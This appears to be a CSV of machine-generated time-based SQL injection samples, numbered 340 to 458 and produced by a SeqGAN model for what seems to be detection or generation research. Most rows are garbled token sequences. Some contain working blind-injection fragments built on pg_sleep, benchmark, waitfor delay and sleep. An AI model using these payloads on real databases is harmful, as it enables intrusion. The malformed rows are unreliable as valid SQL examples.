label,payload,family,payload_type,method,run_id,sample_index
attack,"1%"" where --durand)  ""%""  =  select  )  =  =  5000000,md  =  5  --",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,340
attack,"1""   )    )    rlike sleep  (  5  )   and    (    (   ""%""   )    )    rlike sleep  (  5  )   and    (    (   ""' where 1241  =  1241 waitfor delay '8507  (  =  select  (  2239  0x4c4d6142    (  (  5000000sleep  2044  =  md5  5  5000000,md:(  2841  #  #  sleep  select  (  )  =  =   (  #)  )  vwyq  )  )  g)  -- n  select  )  =  4683  (  (  =  8507  8667  (  =  0x544d5a4c  )  (  =  5    )    (  select  (  (  =  sleep  select  5000000,5  =  (  =  5   and    )  )  1210=  =  =  1210  =",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,341
attack,1 or or 6793  (  (  =  6272  5    )  )  =  0x694a4745   )  )    )  <> =  (  'wyvx'  5  )  s  (    (,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,342
attack,:5    )   and(  =  =  0x694a4745vsfjf,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,343
attack,"1%%""  =  ""(  )  )    )  )   )    )    ))    )    )   or   (c  awax",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,344
attack,1%=  )  #ppp     )  =     )  #,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,345
attack,1'  )   waitfor delay 'et  =  =  =  0x694a4745  #,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,346
attack,"1""  (  5    )    )  se",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,347
attack,"1""(  select  (  select  sleep  )  (  ' or where 8507f  )    )  =    --",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,348
attack,"  whereuu  )  (  6175  0x76555642l    (    =  5      (  sleep  (    and 6793  sleep  0x694a4745e (td  =  =  =  sleep  =  (  ""wucy"" or ""  sleep    select    5   and    )  sleep  =  benchmark  )    )     )  (  5000000,=  =  select  sleep  (  sleep  (  (  #      =  =  ""  6967  (  # or where #)  (    (  =  (  =  (  =  =  =  =  =  =  =  =  6175  =  ",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,349
attack,"t  7305  =  =  =  sleep  =  =  sleep  5  )  =  (  5000000,=  =  =  1568 or  =  (  =  =  =  (  #  (  5000000,sleep  =  =  =  =  (  =  (  1132  =  #  =  sleep  =  (     (  5000000,sleep  0x544d5a4c  )   )    )  )    )  )    and 4240yq",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,350
attack,waitfor from 7021  =  =  =  =  (  6175  0x544d5a4c  sleep  (  select  sleep     (  (  sleep  5  w5qyq  )    )  (  (  (  select  6272e  5  vx 'yfvu' * where * 6793  )  =  (  (  =  0x76555642   )     )    )  )  )    --,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,351
attack,"1"" or sleep  ""l",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,352
attack,"1' and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )    and '          )  =  6383  =  =  =  sleep  benchmark  6272  5    (  ""%""  =5  )  --",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,353
attack,r or '0:0:2' *)    (  2044  (  select  5      )  sleep    =  5     7021  5   --,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,354
attack,1%'  )  6272 (  =  = pg_sleep  =  =  5  wyy,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,355
attack,1%%)  )  )   --u,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,356
attack,"10'||  (  select 'z<1%' and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and 'e'  sleep  )   andszfvyq  =  =  =  =  (  (  =  ""%""    (     )  sleep  (  select  =  5   --",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,357
attack,1  5    )  g  =  (    =  )  )    ))   )    and   )  )    )   #,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,358
attack,"1""   (  5   )    )    )  )   andlt  =  =  #",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,359
attack,"1"" and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and """,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,360
attack,"1'||  (  select 'Wor  (  select  #  1210,8507  =  (  =  =  1210  =  (  5000000,sleep  (  5  sleep    --",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,361
attack,"1""fh",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,362
attack,5  )   (  (  0x544d5a4c   )    )' and   (  'zc --,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,363
attack,"1""  5  s"" like ""  )   )'  )    )   --",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,364
attack,1'  6272 e  =  =  =  )  =  =  =      )  =  =  5    )  v--,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,365
attack,"18252'   )    )     )   and sleep  (  5  )   and    (    (     (  '     )  )   )    )   or or or  6272  (  sleep  sleep   1568  2044 waitfor  =  =  (  =  =  benchmark  =  =  select  (  =  =  (  =  3114,sleep  5  )  s  =67930x694a4745  )  )    )  7021  =  1210sleep  =    (  ""wucy"" 8466  6272  5  8252  )   --t",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,366
attack,"1""  )   and or 8594  =  =  =  =  5  )     )  )  y",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,367
attack,1%'sa's   )   --,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,368
attack,"1%""  5  v(  e   )    )   )  or 3824  5  5  =  =  =  --",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,369
attack,"  =  =  0x76555642 5  (  sleep  ""%""  #  =      (  ' and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and '  =  5  )  ",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,370
attack,1  )   v%,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,371
attack,1' xselect  (  select  =  =  =  (  5   )  st  sleep  =  =  )  )  #yq,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,372
attack,"1  ""   )   --y",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,373
attack,1  (  #)  )   where e   n,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,374
attack,"1""  5   )   )   )    )    )    )   )hr and",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,375
attack,",5    va)   )   --mdyq)  =  =  'rst,m",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,376
attack,"1'  )    )   )   and k,sleep  =  =  =  1210,sleep  =)   )   )    )   )     )  )  sbasty",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,377
attack,1   sbe 0x6d457153   --,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,378
attack,1',time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,379
attack,"""   )    )    rlike sleep  (  5  )   and    (    (   ""tr)  y",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,380
attack,1%rj    benchmark    --,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,381
attack,"selectlt  5    )     )    asstur m)         and 4240  2841  5  )  =  1210   (  =  =  =  5    )  select  )  'fegp'  sleep  =    5     ) where or   =  =  1679  (  6272  =    =  (  )  1132  =,sleep  (  6175  =  =  select  =    sleep  (  =  =  =  (  =  select  select 8594  ==  (  select ,md5  #  0x544d5a4c   )    )dt  (  6866  benchmark  =  =  =  ",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,382
attack,"1""  )  (  '%'  (  5  u  )  )   )   )  #",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,383
attack,'  =  '  	  (  =  8594  =  5   )   )   #)   )   )  )  )  #,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,384
attack,"1   or from   (  (  =  =  (  '%'  '  3672 where r,4683  )  sleep  5   8514 6793 do  (  (    sleep  =  =  sleep  (  6383 , waitfor  2239  =  =  (  0x544d5a4c   #z where like  3114,sleep  =  5     )  --",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,385
attack,"1  )  )  5  )   )  )    )  ""zlal"")    (   and  =  =     )  (  =  #",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,386
attack,"1"" where from or  (  3114  5   ase",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,387
attack,"5      (  =    (  1210,sleep  (  sleep  2841  5000000,md  =  benchmark  =  select  sleep  =  =  )  )  =  sleep  (  (  5  )  vldih",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,388
attack,"selectz  =  (  =  =    =  =  (  select  5  and    )  sdd     )  =  =  select  =  (  5  5874yq   where 4240  =  =  sleep  =  =  0x4c4d6142  =  =  =  )  'rnzp'  =  =  )  8252 select  =  5  )  #z  ""%""      (  (  select  (  0x6d457153    (   where 0x6d457153 8466  =    (  (  5  s or  sleep  (  sleep  5   )  (    (  )  )    )  s    )   #",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,389
attack,uselect ,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,390
attack,1%/s   )    )   or sleep  5  )  )    )    )    # r   (  (  =  --  select  0x544d5a4c   (  =  =  5   #,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,391
attack,"1'   )    )     )   and sleep  (  5  )   and    (    (     (  'h   and 7305  1210benchmark  =  sleep  5000000,sleep  sleep  (  (  6175  12100x76555642,5    )    )  )   (yf",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,392
attack,"1'  )   waitfor delay '0:0:(  1210  ""  =  (  =  =  5000000,sleep  5  5  )  )  v",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,393
attack,"1%"" where sleep  =  =  (0x4c4d6142  =  (  5  s  e   (  =  0x694a4745",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,394
attack,1'  x,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,395
attack,1 or  5  )select(    (  select  =  5   )   (  ygnp,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,396
attack,  benchmark  =  5  #,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,397
attack,1'    )    )  s  5   )    a)   )   )  )   )  )    as,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,398
attack,"18485--  =  7196  )rldo   #)  ""%""z  3114rm)  =  =  =  =  (  =  =  '",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,399
attack,"1;  ' or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )    and '  select or or  r  5   )  )    )    )  prlido   --",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,400
attack,1   )     7021  5    )    )   )    )    )   or   )  )        <>)       --,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,401
attack,"1o   from or'+  (  select 'd5  5    )  ""zlal""  0x4c4d6142   )  ""uvzc""uaz",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,402
attack,1'  )    )   where )  =  6967  =  =  sleep  8507 where d  =  =  =  sleep  =  5  --,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,403
attack,"1""lt      (      benchmark  =  (  (  1210  sleep  )   and   (  (  1210  5  )  9008  s  =  sleep  5rt  ""%""  =  y_  #",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,404
attack,"1"")  (  5     t    6967 or    sleep  (  =  (  select  5  )    )  (  =  '%'  )  3114f",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,405
attack,"1""  )   )   )  8594 q  =  =  select  5  (  select 4240  5    )    )    )  )    ",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,406
attack,"select)  =  =  sleep  5   (  select pg_sleep sleep  5  )  5000000, 2239  =  =  where  =  8252  =  =  =  =  =  =  (  5   6969q  #  =  5  )  '  )   -- e e or  (  (  5    )  )  (  5  vu)  50000002044  =  sleep  5    )   )   #",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,407
attack,"1%"" or or '0:0:5'",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,408
attack,"1""  )    = or  )  select  # sleep  =  (  =   (      (   )  #",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,409
attack,1'   )    )     )   waitfor delay '00:0:   (  =  )  (  =  5#)  )   (  =    (  (  #  select  (  (  (  =  sleep  0x544d5a4c  )   and from sleep  =  5   )   --,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,410
attack,"  5  )    )  )r  s  )  #  select 8594  9008 ,m  )  =  benchmark2239  sleep,  0x6d457153   (  select  (  --",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,411
attack,"select  0x694a4745  "" like ""  )   and  (  =  0x76555642    -- where,sleep  7021d  =  2239 sleep  3672 sleep  =  select  (  =  =  =  5  sleep      0 '0:0:2' from   (  sleep  --    (  select  =  e  =  =  3114  =  =  (  (  5  )  )   #  =  ""wucy"" 2044    5    )    )     )  )    )   and where 6383 benchmark  5000000,sleep  'rltd5  =  =  =5  (      (  )  )  (  =  =  =  =    (  ",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,412
attack,"1m0select * where pg_sleep  (  5000000,md5   (5  sleep  5  sleep    (      =  (  =  (       (t  (  =  f  (  5   )  ),md5  (  select  (  select  select  (  0x76555642   (      )  (  select  sleep  5  5000000,  =  =  =  5  )  vz    (",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,413
attack,"1%'   )    )     )   and sleep  (  5  )   and    (    (     (  '%90:0:6272%  6272  5  )    )    )    )    )   where or  )  5000000,mddm_     (  5  yfy<> where 2239  =  0x544d5a4c   (select)   or     #  select * from   )    4683  (  5   )  #ct  =    )  (  (  6383q  5     and    4683 or  =  select  1210,sleep  5     )  )    )  )    )5     )    )  )      )  =  =  =  1915  )  # likez'hrta'  #",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,414
attack,"1"" or * from  1210d       =  9008  =  =  5  #)  )  )    vhrl",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,415
attack,'  ) 2841  =  '',time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,416
attack,"1' or ,mdfrom  sleep  select  =  =  5    (  )   --",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,417
attack,1  1915  'hrta'  =  =    5874  =    =  =  8252  5  )  )  -- ee)  )    )    )  )     )  --,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,418
attack,"1""t  )  6967 ,5    andsleep  ""zlal""  =  (  0x694a4745  )  s   58745  ' and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and 'vcvwy",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,419
attack,"1"" sleep    =  =  =  =  1210'  =   --",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,420
attack,105  =  =  8485  =  5   and  5874u,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,421
attack,"select where pg_sleep and  5000000,2841  5    )  )    )  )    )     )    )   )      ""wucy""  (  =  5  )  )  =  9649r",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,422
attack,"1pdd5  )   and  (  (  =  =select  =  =  =  =  5000000,md5  (  =  (  (  =  =  =  (  6272  5   )    )  1210pddo  benchmark  =    #",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,423
attack,"1"" sleep  (  5  )    )  wyazhq  )  )   and    )  --p",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,424
attack,"1""  )    (lvike   )  )  )    )  )   and   --  0x6d457153"" like ""  select   3672  5    )    )   and and  5  )  )    )  )  (  )   )  )  )   )   #  )     (v1915nc",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,425
attack,1',time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,426
attack,"1' and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )    and 'r  )  #",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,427
attack,1'  )   )   and d  =  =  =  select  (  select  (  =  =  =  =  0x544d5a4c   --,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,428
attack,"1 (    (  )  (  =  =  6967  5000000,sleep ,sleep  =  )   (  =)    and or #",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,429
attack,"1""  )  )    al'  =  'v",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,430
attack,1%  (  =  3672 or  5   )  )     )     )  )    )   )    )  g,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,431
attack,Ibenchmark  'rnzp'  6967  =     )   )    )    )   si  )  )  #,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,432
attack,,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,433
attack,d'  )  )   )    )    z      'sa' 6969  =  6383 9008  =  =  =  =  =  =  =  =  =  =  ',time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,434
attack,1'  )   --,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,435
attack,"1    =  "" =  8485 and 'yfvu' * ,md5  5  )    )  )   a(",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,436
attack,"1 (  5000000,benchmark  select  =  =  (  5  vdt  )  )     )    )     'wyvx'  select or 6969  =  =  =  =  =  2044  =  =  =    ""  sleep  =  0x694a4745  sleep    --",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,437
attack,"1""  sleep  (  (  1210  =  =  select sleep  5000000,from and  5   )    )  srmpu5  )  #do  5     )    (  5  )  select e  # '0:0:5'(  5000000,md5  s  5   where :  =,sleep  =  sleep    (  =  5  where from or not  =  (  5   )    )  )  #",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,438
attack,select 0o  0x76555642   where * or sleep  pg_sleep(  1210  (  5   )    )    )  )  vwqh  )'  =  '  )    )    )   #  #,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,439
attack,'  )  #,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,440
attack,1%'  fand or  =  2044  '  #o  select  3114  =  =  =  0x76555642  (  =  =  =  =  =  5l,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,441
attack,1lik)  )  )  )  )    )   (  5  (     )    )  sleep  =  =    and pg_sleep  0x544d5a4c   or  (  5  )  #,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,442
attack, 8514  =  =  sleep5  )   a--(a,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,443
attack,"1"" 8594    (  1210  select  =  5000000,sleep  (  benchmark  =  =  6272,""  (  5000000,m5  0x694a4745   )      sleep  =  =  1210  =  5000000,sleep  =  =  =  =  (    ,sleep  (  =  (  9008  0x544d5a4c   (  sleep  5   )  #",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,444
attack,"1' or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )    and 'like5  --yq e or benchmark  =  =  =    ",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,445
attack,1  )   0x544d5a4c  sh,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,446
attack,"   )    )    )  )     #)  )  )    andz  )  )  )    sr)  )  )  =  select  =  (  (  =  5   )   --""  =  """,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,447
attack,"  )   sleep  """,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,448
attack,"1"" or *  1132  0x6d457153  5   (  =  5874yyq",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,449
attack,' and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and 'inh0p' where 1241  =  1241 waitfor delay 'eastyq  )   --,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,450
attack,"1'  )   8466  )   )  )    )     )   (  5000000,)   where 9008 or    )  =  =  5  )   #",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,451
attack,"1""  )   )(  )    )  (  (  select 6793  sleep  5000000  9008  5  )    )    )    )    )  #",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,452
attack,1' pg_sleep  (  5   --,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,453
attack,"1',h or or  sleep  1210  =  5    )     )  )  )  (  select  (  =   (    (  (  select  (  select  (  5  )    )    )     lfromt  =  =  =  =  =  =    (  (  (  (  =  5  5  )    )    )  #viyyq  select  (  (  (  )  =  (  =  select  =  (  =  =  =  =  (  '%'  5  )  =  =  selectt  0x544d5a4c from   (  cf)  8507  yq  '   ",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,454
attack,"1""  )  and   (  62729008  0x544d5a4c   (  'hrta'  =  =    (  5     --t  =  select "" delay   6175 or ,'0:0:5')  1915z'%'  ""zlal""  o  )   )  )    )  )   )  sleep  5    )  s)  )   and )  )     )  )  )  )     andselb)  --",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,455
attack,"select 1132  =  5000000,mdd5  =  1210  =  ""  5  =  (  #  =    (     )    )    )    )   )    )    )    )  )    )   )  (       )    )    or 6793  5    )  (y  gq  select  (  )pg_sleep  )  #",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,456
attack,"  select  sleep  (  =  12104683 6969,2841  sleep  (  select,(  1210sleep  =  =  benchmark  =  0x76555642  =  =  5  6175  6272t  0x544d5a4c  )  #",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,457
attack,"  sleep  =  5   )    )     )   )  )    )    st  )   )    )    )  st  )  srl   y      2239  =  =  =  =  1210  =  =  benchmark  =  =  (  =  =   (  5    )     select  )  )    )  )   (  select  (  2044  =  (  (  =  ('  =  '  =  =  3672 from   or  (    =    =  )  (  =  5000000,sleep  3672 9649  =  sleep  (  =  =  1210,=  =  1210  =  =  =",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,458
